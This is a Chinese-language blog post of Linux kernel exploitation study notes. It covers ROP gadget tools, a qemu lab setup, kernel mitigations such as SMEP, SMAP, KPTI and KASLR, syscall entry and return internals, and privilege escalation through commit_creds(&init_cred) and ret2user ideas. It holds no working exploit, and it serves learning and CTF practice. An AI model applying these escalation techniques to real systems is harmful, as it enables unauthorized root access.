<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; ./gadgets</span><br></pre></td></tr></table></figure>

<p>有一说一, ROPgadget是真慢吧, 用这个ropr快的跟马一样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Ben-Lichtman/ropr</span></span><br></pre></td></tr></table></figure>



<h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><p>qemu启动虚拟机的脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \							<span class="comment">#内存大小为128MB</span></span><br><span class="line">    -cpu kvm64,+smep,+smap \			<span class="comment">#cpu采用kvm64模型,开启smep和smap保护</span></span><br><span class="line">    -kernel vmlinuz \					<span class="comment">#使用vmlinuz作为内核镜像</span></span><br><span class="line">    -initrd initramfs.cpio.gz \			<span class="comment">#指定内存文件系统</span></span><br><span class="line">    -hdb flag.txt \						<span class="comment">#指定虚拟硬盘</span></span><br><span class="line">    -snapshot \							<span class="comment">#快照模式,不会修改虚拟硬盘内容,只会修改内存</span></span><br><span class="line">    -nographic \						<span class="comment">#不使用图形界面</span></span><br><span class="line">    -monitor /dev/null \				<span class="comment">#禁用qemu monitor接口,实际上是将其重定向到垃圾桶</span></span><br><span class="line">    -no-reboot \						<span class="comment">#即使内核崩溃也不重启</span></span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>	<span class="comment">#额外启动参数,指定控制台设备,开启kaslr,kpti</span></span><br></pre></td></tr></table></figure>

<p>如果需要调试内核,还得加上<code>-s</code>选项,启动<code>gdb</code>调试功能</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -kernel vmlinuz \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -hda flag.txt \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>\</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<p>默认会在本机1234端口上监听gdb附加调试</p>
<p>如果不想使用gef,pwndbg等插件,只使用裸gdb调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb --nx vmlinux</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>



<h2 id="kernel-mitigation-features"><a href="#kernel-mitigation-features" class="headerlink" title="kernel mitigation features"></a>kernel mitigation features</h2><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p><code>canary</code>: 内核堆栈金丝雀</p>
<h3 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h3><p><code>kaslr</code>: 内核地址随机化</p>
<h4 id="FG-KASLR"><a href="#FG-KASLR" class="headerlink" title="FG-KASLR"></a>FG-KASLR</h4><p>函数kaslr</p>
<p>不光内核镜像整体基地址会变</p>
<p>代码段的一些函数也会随机变位置</p>
<h3 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h3><p><code>smep(supervisor mode execution protection)</code>: 内核态时不允许执行用户空间代码</p>
<blockquote>
<p><code>CR4</code>第<code>20</code>位置<code>1</code></p>
<p>开启: <code>-cpu +smep</code></p>
<p>关闭: <code>-append nosmep</code></p>
</blockquote>
<h3 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h3><p><code>smap(supervisor mode access prevention)</code>: 内核态时不允许访问用户空间数据</p>
<blockquote>
<p>CR4第21位置1</p>
<p>开启: <code>-cpu +smap</code></p>
<p>关闭: <code>-append nosmap</code></p>
</blockquote>
<h3 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h3><p><code>kpti(kernel page table isolation)</code>, 内核页表隔离</p>
<p>开启时启用两张页表, 在内核态时的页表包含了内核空间与用户空间</p>
<p>在用户态时的页表是只有用户空间的拷贝</p>
<p>开启<code>-append kpti=1</code></p>
<p>关闭<code>-append nopti</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<h2 id="context-switch"><a href="#context-switch" class="headerlink" title="context switch"></a>context switch</h2><p>以系统调用与其返回过程为例, 观察上下文切换过程</p>
<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>以write为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//write @ linux0.12/lib/write.c</span></span><br><span class="line">_syscall3(<span class="type">int</span>, write, <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> *, buf, <span class="type">off_t</span>, count)</span><br></pre></td></tr></table></figure>

<p><code>__syscalln</code>表示有n个参数的系统调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_syscall3 @ linux0.12/include/unistd.h</span></span><br><span class="line"><span class="comment">/* 有3个参数的系统调用函数	type_name(atype a,btype b,ctype c) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall3(type, name, atype, a, btype, b, ctype, c) \</span></span><br><span class="line"><span class="meta">type name(atype a, btype b, ctype c) 				\</span></span><br><span class="line"><span class="meta">&#123; 													\</span></span><br><span class="line"><span class="meta">	long __res; 									\</span></span><br><span class="line"><span class="meta">	__asm__ volatile (<span class="string">&quot;int $0x80&quot;</span>					\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;=a&quot;</span> (__res) 								\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;0&quot;</span> (__NR_##name), <span class="string">&quot;b&quot;</span> ((long)(a)), <span class="string">&quot;c&quot;</span> ((long)(b)), <span class="string">&quot;d&quot;</span> ((long)(c))); \</span></span><br><span class="line"><span class="meta">	<span class="keyword">if</span> (__res &gt;= 0) 								\</span></span><br><span class="line"><span class="meta">		return (type) __res; 						\</span></span><br><span class="line"><span class="meta">	errno = -__res; 								\</span></span><br><span class="line"><span class="meta">	return -1; 										\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>

<p>实际上调用约定:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = __NR_write 	(write的系统调用号)</span><br><span class="line">rbx = fd 			(第一个参数)</span><br><span class="line">rcx = buf 			(第二个参数)</span><br><span class="line">rdx = count 		(第三个参数)</span><br></pre></td></tr></table></figure>

<p>然后执行<code>int 0x80</code>指令,</p>
<blockquote>
<p>所有的<code>int n</code>指令,都对应到<code>IDT(Interrupt Describetor Table)</code><strong>中断描述符表</strong>中的一个门</p>
<p><code>IDT</code>表共有<code>256</code>个表项,也就是说<code>int n</code>这里的<code>n</code>能够允许的范围是<code>0~255</code></p>
<p>其中0~31项保留给CPU定义的异常和中断, 也就是内部中断或异常</p>
<p>​	比如int 0 表示除法出错, 也就是DIV出错</p>
<p>​	比如int 3 表示断点命中</p>
<p>32~255保留给用户或者设备, 也就是外部中断或者异常</p>
<p>​	比如int 0x80 表示系统调用</p>
<p>IDT表中有三类表项, 中断门,陷阱门,任务门</p>
</blockquote>
<p><code>int 0x80</code>这条指令在<code>sched_init @ kernel/shed.c</code>中被注册为陷阱门</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sched_init @ kernel/shed.c</span></span><br><span class="line">set_system_gate(<span class="number">0x80</span>,&amp;system_call);	</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_system_gate(n, addr) 	_set_gate(&amp;idt[n], 15, 3, addr)</span></span><br></pre></td></tr></table></figure>

<p>在该陷阱门中<code>system_call</code>函数被注册为中断处理过程</p>
<blockquote>
<p> <code>system_call</code>在<code>kernel/sys_call.s</code>中被定义为一个函数, 是所有系统调用的入口, 以eax寄存器值作为系统调用号索引对应系统调用函数</p>
</blockquote>
<p><code>int 0x80</code>过程:</p>
<p>1.由<code>IDTR</code>寄存器查到<code>IDT</code>表基地址</p>
<p>2.以<code>0x80</code>作为索引查<code>IDT</code>表得到<code>IDT[0x80]</code>门, 是一个陷阱门</p>
<p>3.<code>IDT[0x80]</code>中获得(中断处理过程所在段的)段选择子, 陷阱门<code>DPL</code>, (中断处理过程在其)段中的偏移量</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120152851772.png" alt="image-20241120152851772"></p>
<p>4.由段选择子查<code>LDT</code>或者<code>GDT</code>表获得中断处理过程<code>system_call</code>所在段</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120153036405.png" alt="image-20241120153036405"></p>
<p>然后段基地址加上<code>IDT</code>中保留的偏移量找到<code>system_call</code>函数地址</p>
<p>5.在调用<code>system_call</code>函数之前, 需要考虑前后段属性是否有改变</p>
<p>对于系统调用来说, 是从3环上经过陷阱门调用<code>0</code>环上的<code>system_call</code>, 段权限发生了变化</p>
<p>因此首先切换堆栈, 从用户堆栈切换到内核堆栈, 切换过程:</p>
<p>​	(1) 从当前用户任务的TSS段中得到<code>0</code>环堆栈的段地址<code>ss0</code>和栈顶指针<code>esp0</code></p>
<p>​	(2) <code>ss3:esp3</code>更换为<code>ss0:esp0</code></p>
<p>​	(3) <code>ss3:esp3</code>压到新栈中保存, <code>eflags, cs:eip </code>也依次压入新栈</p>
<p>​	(4) 异常产生的错误号压栈(如果有的话)</p>
<p>对于同级的中断,比如内核中执行时遭遇除零异常等,不会发生堆栈切换</p>
<p>​	(1)<code>eflags, cs:eip</code> 压栈</p>
<p>​	(2)异常产生的错误号压栈(如果有的话)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120155553711.png" alt="image-20241120155553711"></p>
<p>6.此后就运行在内核态的<code>system_call</code>函数中了</p>
<p>7.当<code>system_call</code>要返回时,最后会有一条<code>iret</code>指令,而不是普通的<code>ret</code>指令</p>
<p>此时内核栈或者说<code>0</code>环栈上的状态, 和刚进入<code>system_call</code>时相同,</p>
<p><code>iret</code> 指令会根据栈顶上的内容还原到之前的用户程序中</p>
<blockquote>
<p> <code>ret2user</code>的原理就是在内核堆栈中伪造一个假的用户上下文,让<code>iret</code>返回到攻击者期望的用户程序中</p>
</blockquote>
<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>x64上的系统调用不再使用中断向量表, 也就是说不会再使用<code>int</code>系指令 </p>
<p>x64上引入了新的中断机制, 叫做APIC, 并且给系统调用实现了专门的<code>syscall</code>指令, </p>
<p>必须将系统调用入口函数<code>entry_SYSCALL_64</code>的地址, 注册到<code>MSR</code>寄存器中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@linux5.13/arch/x86/kernel/cpu/common.c/syscall_init.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">syscall_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	wrmsr(MSR_STAR, <span class="number">0</span>, (__USER32_CS &lt;&lt; <span class="number">16</span>) | __KERNEL_CS);</span><br><span class="line">	wrmsrl(MSR_LSTAR, (<span class="type">unsigned</span> <span class="type">long</span>)entry_SYSCALL_64);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



<p>此后syscall指令会查MSR寄存器,跳到<code>entry_SYSCALL_64</code>中执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SYM_CODE_START(entry_SYSCALL_64)</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	swapgs</span><br><span class="line">	<span class="comment">/* tss.sp2 is scratch space. */</span></span><br><span class="line">	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)</span><br><span class="line">	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp</span><br><span class="line">	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">	pushq	$__USER_DS				<span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	<span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">	pushq	%r11					<span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">	pushq	$__USER_CS				<span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">	pushq	%rcx					<span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)</span><br><span class="line">	pushq	%rax					<span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line"></span><br><span class="line">	PUSH_AND_CLEAR_REGS rax=$-ENOSYS</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IRQs are off. */</span></span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	movq	%rsp, %rsi</span><br><span class="line">	call	do_syscall_64		<span class="comment">/* returns with IRQs disabled */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Try to use SYSRET instead of IRET if we&#x27;re returning to</span></span><br><span class="line"><span class="comment">	 * a completely clean 64-bit userspace context.  If we&#x27;re not,</span></span><br><span class="line"><span class="comment">	 * go to the slow exit path.</span></span><br><span class="line"><span class="comment">	 * In the Xen PV case we must use iret anyway.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;&quot;</span>, <span class="string">&quot;jmp	swapgs_restore_regs_and_return_to_usermode&quot;</span>, \</span><br><span class="line">		X86_FEATURE_XENPV</span><br><span class="line"></span><br><span class="line">	movq	RCX(%rsp), %rcx</span><br><span class="line">	movq	RIP(%rsp), %r11</span><br><span class="line"></span><br><span class="line">	cmpq	%rcx, %r11	<span class="comment">/* SYSRET requires RCX == RIP */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP</span></span><br><span class="line"><span class="comment">	 * in kernel space.  This essentially lets the user take over</span></span><br><span class="line"><span class="comment">	 * the kernel, since userspace controls RSP.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If width of &quot;canonical tail&quot; ever becomes variable, this will need</span></span><br><span class="line"><span class="comment">	 * to be updated to remain correct on both old and new CPUs.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Change top bits to match most significant bit (47th or 56th bit</span></span><br><span class="line"><span class="comment">	 * depending on paging mode) in the address.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_5LEVEL</span></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;shl $(64 - 48), %rcx; sar $(64 - 48), %rcx&quot;</span>, \</span><br><span class="line">		<span class="string">&quot;shl $(64 - 57), %rcx; sar $(64 - 57), %rcx&quot;</span>, X86_FEATURE_LA57</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	shl	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line">	sar	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If this changed %rcx, it was not canonical */</span></span><br><span class="line">	cmpq	%rcx, %r11</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_CS, CS(%rsp)		<span class="comment">/* CS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	movq	R11(%rsp), %r11</span><br><span class="line">	cmpq	%r11, EFLAGS(%rsp)		<span class="comment">/* R11 == RFLAGS */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SYSCALL clears RF when it saves RFLAGS in R11 and SYSRET cannot</span></span><br><span class="line"><span class="comment">	 * restore RF properly. If the slowpath sets it for whatever reason, we</span></span><br><span class="line"><span class="comment">	 * need to restore it correctly.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * SYSRET can restore TF, but unlike IRET, restoring TF results in a</span></span><br><span class="line"><span class="comment">	 * trap from userspace immediately after SYSRET.  This would cause an</span></span><br><span class="line"><span class="comment">	 * infinite loop whenever #DB happens with register state that satisfies</span></span><br><span class="line"><span class="comment">	 * the opportunistic SYSRET conditions.  For example, single-stepping</span></span><br><span class="line"><span class="comment">	 * this user code:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 *           movq	$stuck_here, %rcx</span></span><br><span class="line"><span class="comment">	 *           pushfq</span></span><br><span class="line"><span class="comment">	 *           popq %r11</span></span><br><span class="line"><span class="comment">	 *   stuck_here:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * would never get past &#x27;stuck_here&#x27;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11</span><br><span class="line">	jnz	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* nothing to check for RSP */</span></span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_DS, SS(%rsp)		<span class="comment">/* SS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We win! This label is here just for ease of understanding</span></span><br><span class="line"><span class="comment">	 * perf profiles. Nothing jumps here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">syscall_return_via_sysret:</span><br><span class="line">	<span class="comment">/* rcx and r11 are already restored (see code above) */</span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span> skip_r11rcx=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now all regs are restored except RSP and RDI.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	pushq	RSP-RDI(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	(%rdi)		<span class="comment">/* RDI */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	popq	%rdi</span><br><span class="line">	popq	%rsp</span><br><span class="line">	swapgs</span><br><span class="line">	sysretq</span><br><span class="line">SYM_CODE_END(entry_SYSCALL_64)</span><br></pre></td></tr></table></figure>

<p>执行完毕后使用sysretq返回到用户态</p>
<p>在x64上有两种返回到用户态的命令</p>
<p><code>sysret</code>和<code>iret</code></p>
<p>注意到<code>x64</code>上<code>syscall</code>一开始和最后<code>sysret</code>之前, 都有一个<code>swapgs</code>, 这个指令也是<code>x64</code>独有的</p>
<p><code>fs,gs</code>这两个段寄存器是<code>x86</code>上引入的两个附加段寄存器</p>
<p><code>fs</code>用于在用户态的<code>glibc</code>中保存<code>TLS</code></p>
<p><code>gs</code>用于在内核态保存<code>percpu</code>变量与<code>canary</code></p>
<p><code>fs</code>在内核态无用,<code>gs</code>在用户态无效</p>
<p><code>swapgs</code>中更换的<code>gs</code>来自于MSR寄存器</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120204022830.png" alt="image-20241120204022830"></p>
<p>总是当前使用一个,然后MSR记住另一个</p>
<h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>进程权限由<code>task_struct</code>的成员<code>struct cred *cred</code>控制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;</span><br><span class="line">    <span class="type">kuid_t</span> uid;</span><br><span class="line">    <span class="type">kgid_t</span> gid;</span><br><span class="line">    <span class="type">kuid_t</span> suid;</span><br><span class="line">    <span class="type">kgid_t</span> sgid;</span><br><span class="line">    <span class="type">kuid_t</span> euid;</span><br><span class="line">    <span class="type">kgid_t</span> egid;</span><br><span class="line">    <span class="type">kuid_t</span> fsuid;</span><br><span class="line">    <span class="type">kgid_t</span> fsgid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> securebits;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jit_keyring;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">session_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">process_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">thread_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">request_key_auth</span>;</span></span><br><span class="line">    <span class="type">void</span> *security;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想要提升一个普通进程的权限到<code>root</code>, 可以找一个<code>root</code>进程的<code>cred</code>抄过来</p>
<p>修改进程<code>cred</code>的方法:</p>
<p>1.要么构造<code>rop</code>链调用内核函数<code>commit_creds(&amp;init_cred);</code>,抄<code>init</code>进程的<code>cred</code>替换当前进程的</p>
<p>2.要么有一个内核内存任意写的利用原语, 找到当前进程<code>task_struct</code>, 然后找到<code>cred</code> , 然后修改之</p>
<h3 id="commit-creds-init-cred"><a href="#commit-creds-init-cred" class="headerlink" title="commit_creds(&amp;init_cred);"></a>commit_creds(&amp;init_cred);</h3><p>这就有一个问题,怎么才能找到<code>init</code>进程的<code>cred</code>?</p>
<p>怎么才能找到<code>struct init_task</code>?</p>
<p><code>Linux 6.2</code>之前有另一个函数<code>prepare_kernel_cred</code>给我们代劳</p>
